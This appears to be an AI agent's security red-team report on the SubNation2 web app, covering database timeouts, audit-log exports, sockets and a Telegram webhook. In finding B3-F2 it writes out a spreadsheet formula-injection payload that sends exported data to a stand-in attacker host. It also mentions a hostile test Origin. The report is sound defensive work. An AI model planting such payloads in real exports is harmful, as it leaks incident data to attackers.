# R128-B3 — Security Red-Team on the NEWEST Surface (R122–R127 output)

- **Agent:** R128-B3 (adversarial security, parallel fleet round 128)
- **Repo:** `SubNation2` @ `main` = `7d469d5` (read-only; only this report + one worklog append)
- **Scope — the 7 newest surfaces:** (1) audit-logs endpoint + UI (8b6357d), (2) socket-resync + alert-room reconciliation (a8151a9), (3) OpenAPI batch-2 + client flips (0b61619), (4) Telegram webhook audit rows + money path (8b6357d), (5) statement_timeout + migration 0020 (f029a63), (6) R127 defers → first-interaction (a1426cb), (7) cross-cutting: env additions c2f531a..7d469d5, workflow supply chain, CSP.
- **Not re-reported (read first):** R127-B11 archaeology, R127-R1 §1–§9, R126-A7 RBAC matrix (swept twice), R126 security lanes, R125-A3. Where R1 verified a thing I attacked it from a *different* angle and only re-verified what my new attack needed.
- **Verdict:** **0 P0 · 0 P1 · 2 P3 · 3 P4.** No money-safety, auth, or contract defect in the new surface. The two P3s are *hardening* classes on the very defenses this round shipped: the statement_timeout SET can silently become inert again (zero telemetry — the exact failure mode it was created to fix), and the new audit-tab CSV export is a formula-injection surface aimed at the incident-responder workflow.
- **Method:** full reads of every target file at HEAD + live guest-level probes (4× audit-logs 401s, 3× socket.io handshake/CONNECT — all non-destructive) + ONE single-file vitest adversarial probe suite (6 cases against the real audit-logs route on the pglite harness — run green, then **deleted** to restore the read-only tree; transcript below).

---

## 1. Findings

### B3-F1 [P3] statement_timeout's post-connect SET fails SILENTLY — the defense can go inert again with zero signal

**File:line:** `shared/db/src/index.ts:161-166`

```ts
for (const p of [pool, lockPool]) {
  p.on("connect", (client) => {
    if (statementTimeoutMs > 0)
      void client.query(`SET statement_timeout = ${statementTimeoutMs}`).catch(() => {});
  });
}
```

**Attack scenario (regression class, not an exploit today):** R127-B8 discovered that the R4 startup-packet transport of `statement_timeout` had been **silently inert on Neon for 34 rounds** — the packet is sent, Neon ignores it, every session reports `statement_timeout = 0`, and a live-but-stuck query pinned its pool client indefinitely. The post-connect `SET` hook is the fix. But the hook's failure mode is *the same class it came to fix*: if Neon's pooler (or a future proxy/traffic-manager change) starts rejecting session-level `SET`s — or a config regression sets `PG_STATEMENT_TIMEOUT_MS=0` accidentally-but-validly — every new connection silently runs unbounded, with **no log line, no metric, no counter, no boot assertion**. The in-code comment even documents the swallow as intentional ("the query then simply runs unbounded, exactly like before this hook") — accurate, but "exactly like before this hook" is exactly the state B8 classified as a P2. An operator has no way to distinguish "defense live" from "defense inert" without a manual psql probe — which is how the first one survived since round 93.

**Fix (S, no dependency cycle):** log in the catch — the file already uses `console.error` for pool errors with the documented justification that importing the backend logger from `@workspace/db` inverts the workspace dependency direction (index.ts:170-182). Add `console.error("[db] statement_timeout SET failed — queries on this connection run unbounded", err)` in the catch, plus (optional, stronger) a one-shot boot verification that runs `SHOW statement_timeout` through the pool and logs the verdict — automating the exact manual probe B8 performed. The backend's `instrumentDbPool` already counts pool errors on the same EventEmitter, so a second cheap listener there is also viable.

**Both pools verified:** `pool` + `lockPool` are the ONLY pg pools in the workspace — `import pg from "pg"` resolves at exactly one path repo-wide (`shared/db/src/index.ts:2`, rg over backend/shared/frontend/scripts, node_modules excluded); no probe/worker/migration pool bypasses the hook (both are spread from the same `poolConfig`; the hook loop covers both explicitly).

---

### B3-F2 [P3] CSV formula injection in the NEW audit-tab export (and its auth-activity twin) — aimed at the incident responder

**File:line:** `frontend/src/pages/admin/security.tsx:331` (`escapeCsvField`), `:347-357` (audit rows), `:381-391` (auth rows)

**Attack scenario:** `escapeCsvField` quotes and doubles `"` but does **not** neutralize the spreadsheet formula triggers (`=`, `+`, `-`, `@`, tab, CR as leading characters). Reachable exported fields:

- **Audit CSV (new in R127):** `actorUsername` (admins-scope-created usernames — a compromised/malicious admins-scope operator), and `metadata` — which for Telegram rows contains `actor=@<username>` where the username arrives from the **webhook request body** (`telegram-webhook.ts:166`): a `TELEGRAM_WEBHOOK_SECRET` holder can post any string, including `=WEBSERVICE("https://attacker/leak?d="&A2)` or `=HYPERLINK("https://attacker","open")`. Telegram itself enforces `[A-Za-z0-9_]{5,32}`, but the webhook trusts the body — the secret is the only gate.
- **Auth CSV (pre-existing, same escape):** `a.identifier` is a **user-controlled identity string**; phone identifiers legitimately render as `+218…` — a leading `+` is itself a formula trigger in Excel and Google Sheets.

Chain: plant the payload (forged webhook post / admins-scope username edit / user-controlled identifier) → an admins-scope operator exports «إجراءات المسؤولين» **during an incident review** (the artifact this tab exists for) → opens the CSV in Excel/Sheets → `WEBSERVICE`/`HYPERLINK` fires on open → the audit window (IPs, usernames, metadata) is exfiltrated to the attacker's origin. Severity tempered by the gates (webhook secret / admins scope / identifier validation on the user path), but the target is defense-in-depth's own instrument.

**Fix (S):** in `escapeCsvField`, prefix-guard cells whose first char is `=`, `+`, `-`, `@`, tab, or CR (the standard mitigation is a leading `'` for Excel + `\t` for Sheets, or the OWASP-recommended prefix on all such cells). One function, both export arms inherit the fix. Follow-up (separate, cheap): confirm server-side validation on `auth_activity.identifier` character set — the `+`-phone class alone still mangles into formula-evaluated numerics today.

---

### B3-F3 [P4] The 0020 bundle's own rationale ("six prune predicates with no index support") missed the seventh: `pruneReadAlerts` / `deleteReadAlerts`

**File:line:** `backend/src/jobs/alertLogger.ts:258-260` (`eq(is_read, true)` full delete), `:291-317` (`is_read = true AND created_at < cutoff` ctid batches)

The bundle correctly indexed `markStaleUnreadAlertsRead`'s predicate (`is_read = false AND created_at < cutoff` — served 1:1 by partial `idx_admin_alerts_unread … WHERE is_read = false`, alertLogger.ts:286 vs 0020:79) but the read-rows predicates have **no index support** — a seq scan per daily cron slot and per `deleteReadAlerts` admin action. Immaterial today (admin_alerts ~77 rows; the table is deliberately kept small by the very deletes in question) — but the 10⁵-row trigger documented in 0020's header should name `admin_alerts.is_read` as the *one predicate of its family the bundle did not cover*, so the trigger review doesn't assume full coverage. No change requested beyond the doc note (or a matching partial `WHERE is_read = true` twin at trigger time).

---

### B3-F4 [P4] Bidi-spoofing surface in the audit actor cell — the incident table's attribution can be visually rearranged

**File:line:** `frontend/src/pages/admin/security.tsx:610-617`

The actor cell renders `@${log.actorUsername}` with **inherited RTL direction and no unicode-bidi isolation**, while every data cell around it (`metadata` :622-627, `action` :632-634, `target` :636, `ip` :641) is `dir="ltr"`. A username carrying RLO/LRO/PDF bidi controls (planted via the same webhook-secret body path as B3-F2, or an admins-scope username edit) renders with reordered segments in the Arabic RTL table — visually swapping *who approved what* in exactly the accountability artifact an incident review reads. React escapes markup, so this is display-layer spoofing, not XSS. **Fix (one line):** `dir="ltr"` + the existing `truncate` idiom on the actor div (mirroring the metadata line directly below it), or wrap in `<bdi>`.

---

### B3-F5 [P4 — record-only, deliberate posture] Alert-room fail-open window on scope revocation during DB degradation

**File:line:** `backend/src/lib/socket.ts:457-466` (probe catch → `adminPermissions` stays undefined), `:753-776` (reconciliation gated on `liveness.ok && adminPermissions`)

A support-scope-revoked but still-active admin whose revocation lands **while probes are failing** keeps `admin-alerts-room` membership (and its operational PII stream) until a liveness probe *succeeds* — fail-open keeps the cryptographically-sound JWT identity and skips reconciliation. This mirrors requireUser's documented fail-open posture and is bounded by the 5-minute re-verify cadence; the eviction cannot misfire (requires a healthy probe that *explicitly* returned permission sets lacking the scope — R127-R1 verified). Recorded because the class is now load-bearing on a stream that carries coupon codes / risk references; if the fail-open posture is ever revisited, this is the surface it protects.

---

## 2. What I tried that HELD (the important negative results)

| # | Attack | Why it held |
|---|---|---|
| 1 | **Audit-logs coercion classes** — `?actor=1e2 / +5 / 12.0 / 007 / -3 / 0`, whitespace-padded ids | 400 INVALID_DATA on all six shapes — `positiveIntFilter`'s digit-exact `String(parsed) === value` check (audit-logs.ts:48-51) rejects every silent-coercion form. **Verified by fresh execution** — my 6-case probe suite against the real route (isolated gate chain, pglite) ran 6/6 green; file deleted after the run. |
| 2 | **Extended-qs object params** (`?actor[foo]=1&startDate[x]=nope`) on the audit filters | `queryString` (http.ts:23-32) returns the fallback for non-string non-array values → 200 unfiltered, never a crash; matches the A5-09 auth-activity idiom. Proven live in the same suite. |
| 3 | **JS Date-roll shapes** (`?startDate=2026-02-30`) | Rolls to Mar 2 silently (valid Date) or 400s on NaN — the `new Date(...)` NaN→400 guard (audit-logs.ts:86-103) closes the RangeError-500 class; rolled bounds are harmless range filters. Proven live. |
| 4 | **Deep-offset arithmetic** (`?page=100000&limit=999`) | Clamps to page 10 000 × limit 200 — finite offset, MAX_PAGE ceiling intact (http.ts:69-75). Proven live. |
| 5 | **Audit-logs auth bypass / PII over-exposure** | Triple gate (mount `requirePermission("admins")` + `protectedRouter.use(requireAdmin)` + handler requireAdmin — admin/index.ts:40,120-124 + audit-logs.ts:53) verified in code; **live**: unauthenticated GET → 401 `{"error":"غير مصرح"}` with `cache-control: no-store` on the 401 arm too (router-level `router.use` stamp, audit-logs.ts:31-34). Projection omits `userAgent`; metadata carries ids/enums/amounts only — sampled 12 writer call sites (coupons, flash-sales, referrals, whatsapp, auth-settings, risk middlewares): no user PII (phones) flows into metadata; secret values explicitly excluded (auth-settings.ts:645-651). |
| 6 | **Audit-spam via Telegram** (unbounded writes by a malicious tapper / secret holder) | The single `writeAuditLog` sits only on the post-`approve/reject` success arm (telegram-webhook.ts:199-209); every non-money arm returns earlier (non-allowlisted :124-136, unparseable :139-142, missing :153-156, stale :157-164, service-throw :182-186) — a row is written only on a real pending→final transition, so writes are bounded by pending topups. Replay answers "تمت معالجة هذا الطلب مسبقاً" and writes nothing. |
| 7 | **Money-path replay/double-credit under Telegram retries** (same callback delivered twice concurrently) | Pre-check (:146-164) + service belt: `pg_advisory_xact_lock(hashtextextended(ref))` serializes same-reference approvals, in-tx status re-check (:277-283), and the status flip is a conditional `UPDATE … WHERE id=? AND status='pending'` (:385-386) — the second racing delivery fails the in-tx re-check and writes no audit row. Reject path mirrors it (:655-656). `parseTopupCallback` is regex-strict `^topup_(app|rej):\d+$` (:108). Secret: constant-time compare (:36-41), 503-fail-closed when unset (:234-239). Webhook rides `app.use("/api", apiLimiter)` (app.ts:926) — flood-bounded. |
| 8 | **Stale/revoked token subscribing to resync; resync payload broadcast** | `SOCKET_RESYNC_EVENT` is a **window-local CustomEvent with no payload** (lib/socket.ts:103-109) — it never crosses the wire; server room membership is decided at handshake + 5-min DB re-verify. Client branches are token-gated and ride disjoint key-sets (SessionActivityManager storefront-only `if (!token) return` :128; SocketInitializer admin-only :55). |
| 9 | **Park→revive vs resync double events** | Park = `"io client disconnect"` deliberately does NOT arm `wasDisconnected` (lib/socket.ts:91-94) → revive fires no resync event; catch-up rides the 30 s-throttled visibility resync. Any residual overlap is idempotent cache invalidation. |
| 10 | **Socket handshake origin/token bypass (live)** | Engine-level EIO handshake completes for any origin (transport establishment ≠ namespace auth — expected socket.io behavior), but the namespace CONNECT is rejected `44{"message":"unauthorized"}` for BOTH a hostile Origin (`https://evil.example`) AND a valid-origin/no-token attempt — the `io.use` origin allowlist + token gate hold at the CONNECT layer. 3 probes total, nothing mutated. |
| 11 | **Contract documents something the handler doesn't enforce** | All 12 batch-2 paths + audit-logs resolve to real handlers behind their mounts: observability (settings-scope, index.ts:134) routes `/metrics` `/summary` `/scheduler` `/alerts/recent` (observability.ts:79,120,171,194); diagnostics `/`, `/inventory-health` (settings-scope); risk `/dashboard` `/events` (users-scope, index.ts:49); forecast ×3 (inventory-scope, index.ts:54); chart-data + audit-logs (admins-scope + stats-family). No documented-but-unmounted route; the API 404 fallback is uniform JSON + `no-store` (app.ts:929-938) — no route-existence oracle beyond the method/status pair every route already emits. |
| 12 | **Generated-client token leakage to non-admin origins** | The web app's global bearer getter holds **only the storefront user JWT** (main.tsx:56 + auth-token-holder.ts — the `__cookie_session__` sentinel is filtered, so cookie-auth sessions emit NO bearer); admin surfaces hand-pass their own headers, which `customFetch` honors before the getter (custom-fetch.ts:559-568, empty-header deletion included). `setBaseUrl` only activates on split deployments (`getApiBaseUrl()`), same API origin for both session families — no cross-origin admin-token path exists. The boot-gate retry re-sends the identical request (headers re-merged from the same init) — idempotency keys survive (R1's trace re-confirmed at HEAD). |
| 13 | **Mixed-idiom drift in the 4 flipped pages** | `dashboard.tsx`, `referrals.tsx`, `tickets.tsx`, `topups.tsx` contain **zero** raw `fetch(`/`adminFetchJson` calls (rg at HEAD) — fully on the generated client. The `adminFetchJson` family persists only on never-flipped pages (settings/coupons/risk/products/whatsapp/admins/promotions/enrichment/layout/pricing) — the documented batch-3 backlog, not drift. |
| 14 | **Vendor-sentry lazy → pre-interaction Sentry API use (undefined refs)** | The only static `@sentry/react` import sites are `instrument.ts` (the lazy chunk itself), `sentry-replay.ts` (lazy) and boot-sentry's type-only `(typeof import(...))` annotations (erased at build). `ErrorBoundary` dynamic-imports inside `componentDidCatch` (ErrorBoundary.tsx:62); boot-sentry buffers every window/React error synchronously and flushes only after `sentryReady` (boot-sentry.ts:114-129,361-375). In DSN-less builds the `sentryDsnGuardPlugin` stub exports `withScope: noop` (vite.config.ts:712-733) — the ErrorBoundary call shape survives with zero bytes and no throw (callback intentionally not invoked). |
| 15 | **DSN-blind budget gate touching prod builds** | `shouldSubstituteBudgetDsn` = `!VITEST && CI==="true" && empty DSN` (vite.config.ts:262-269) — Docker production builds pass the real DSN via ARG and don't set CI; the placeholder host is RFC-2606 `.invalid` so even a misconfigured CI artifact DNS-fails silently. VITEST guard verified present. |
| 16 | **0020 predicate ↔ prune-query drift** (EXPLAIN impossible — no DB access; textual 1:1 instead) | `sessions.expires_at < now()` ↔ idx_sessions_expires_at ✓; admin_sessions both disjunction arms ↔ expires_at index + partial `WHERE revoked_at IS NOT NULL` (predicate implied by the query's own IS NOT NULL) ✓; idempotency `created_at < cutoff` ↔ idx ✓; login_attempts `last_attempt < cutoff` ↔ idx ✓; notifications **both** is_read arms are `created_at < cutoff` (cutoffs differ) — single created_at index serves the OR via bitmap-OR ✓; forecasts `forecast_date < CURRENT_DATE - 90d` ↔ idx ✓; `markStaleUnreadAlertsRead` ↔ partial unread index (exact predicate match incl. `is_read = false`) ✓; whatsapp_otps re-pointed to the pre-existing `expires_at` index with the documented superset argument (whatsapp-otp.service.ts:963-995) ✓; audit_logs 180d prune rides pre-existing `idx_audit_logs_created` (migrate.ts:2706) ✓. The one gap is B3-F3 above. |
| 17 | **New env vars without boot validation** (diff-extracted `process.env.*` additions in c2f531a..7d469d5) | `PG_STATEMENT_TIMEOUT_MS` (validated + fallback, db/index.ts:80-84), `CSRF_ALLOWED_ORIGINS` (folds into the SEC-92-01 fail-fast empty-in-prod assertion, app.ts:75-133 — a restriction, not a relaxation), `TELEGRAM_WEBHOOK_SECRET` (503-fail-closed when unset), `TELEGRAM_ADMIN_IDS` (defensive numeric parse), `I_ACCEPT_DRIZZLE_PUSH_DANGER` (deliberate danger gate on the drizzle-push dev script — good hygiene), `FRONTEND_DIST` (build-path). No new secret lacks a guard; no CORS/origin relaxation in the range (legacy split-era vars still warn at boot, origins.ts:38-56). |
| 18 | **Supply-chain regression after the 13→0 zizmor round** | `git log 007316c..HEAD -- .github/` is **empty** — no workflow edits after the supply-chain commit. All 24 `uses:` across ci.yml/docker.yml are full-SHA-pinned (incl. the round's new `dorny/paths-filter`, `gitleaks-action`, `codeql-action`). |
| 19 | **CSP connect-src drift (live vs code)** | Live header on `/api/admin/audit-logs` matches app.ts:203-233 byte-for-byte; connect-src ends `…googletagmanager.com https://subnation.ly https://www.subnation.ly` — exact allowlist, no wildcards beyond the documented Sentry/GA/Firebase families; unchanged in the range diff. |
| 20 | **Audit trail as exfiltration channel (support-scope visibility)** | The reader is `admins`-scope — above support; support-scope admins 403 (route suite pins it, mount re-verified). Row PII = actor username + ip + metadata — the feature's purpose, behind the admins gate. IP resolution is CF-chain-validated (audit.ts:26-55); Telegram rows record Telegram's edge IP (documented honest source). Retention: 180d, pruned idempotently. |

---

## 3. Live probes (guest-level, non-destructive, ≤4 req/endpoint)

| Probe | Result |
|---|---|
| `GET https://subnation.ly/api/admin/audit-logs` (no auth) | **401** `{"error":"غير مصرح","code":"UNAUTHORIZED"}`, `cache-control: no-store`, CSP exact, HSTS preload, `ratelimit: "600-in-1min"` active |
| 2× follow-up 401s | Limiter decrementing (`r=578 t=14` → `r=599 t=60` on window roll) — per-IP partition active on the admin family |
| socket.io EIO polling handshake (hostile + valid Origin) | Engine handshake completes both (transport-only, expected); **namespace CONNECT** → `44{"message":"unauthorized"}` in both cases — origin allowlist AND token gate enforced at the auth layer |

## 4. Verification runs (mine)

- **1 single-file vitest** (`backend/src/routes/admin/__tests__/b3-audit-edges.probe.test.ts`, 6 adversarial cases: coercion ids, zero/negative ids, extended-qs object params, Date-roll shapes, explicit sentinels, page×limit clamp arithmetic) — **6/6 green** against the real route on the shipped pglite harness idiom. **File deleted immediately after** — `git status` clean except this docs dir; the read-only mandate is restored (the suite's content is preserved in this section for re-creation if wanted).
- No other suites run (R1's 7-suite battery + the 13/13 route suite + 3/3 webhook suite cover the rest; no need to re-burn the 2-CPU box).

## 5. Priority table

| ID | Sev | One-line | Effort |
|---|---|---|---|
| B3-F1 | **P3** | statement_timeout SET failure is a silent no-op (zero telemetry) — the R4-inert-for-34-rounds class can silently return | S (catch log + optional boot `SHOW` probe) |
| B3-F2 | **P3** | Audit-tab CSV (new) + auth CSV: no formula-injection guard on `=`/`+`/`-`/`@`-leading cells — incident-responder exfil vector | S (one escapeCsvField guard) |
| B3-F3 | P4 | `pruneReadAlerts`/`deleteReadAlerts` predicates uncovered by 0020 — name them in the 10⁵-row trigger doc | doc note |
| B3-F4 | P4 | Audit actor cell lacks `dir="ltr"`/bidi isolation — attribution visually rearrangeable | one line |
| B3-F5 | P4 | Alert-room fail-open window on revocation-during-DB-degradation — deliberate, recorded | record |

## 6. Recommended next actions

1. **Before this round's push (both S-sized, both on this round's own output):** land B3-F1's catch-log and B3-F2's CSV guard. Neither blocks correctness today; both close silent-regression doors on surfaces shipped 5 commits ago.
2. B3-F4 one-liner can ride the next copy/UX commit; B3-F3 is a doc sentence in 0020's header.
3. Consider (next round, not now): automating the statement_timeout verification as a `/api/admin/diagnostics` readback so the defense's liveness is operator-visible without psql — same spirit as the DSN console warnings.
